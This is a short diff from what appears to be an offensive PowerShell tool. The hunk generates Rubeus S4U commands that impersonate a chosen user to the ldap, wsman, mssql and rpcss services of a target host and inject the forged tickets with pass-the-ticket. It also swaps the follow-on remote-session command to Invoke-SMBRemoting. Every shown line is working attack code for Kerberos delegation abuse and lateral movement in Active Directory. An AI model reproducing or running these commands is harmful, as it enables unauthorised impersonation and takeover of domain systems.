@@ -174,7 +174,7 @@ Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHost
 Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
 Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
 Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
-Enter-SMBSession -ComputerName $FQDNHostname
+Invoke-SMBRemoting -ComputerName $FQDNHostname
 "@
 	}
 	
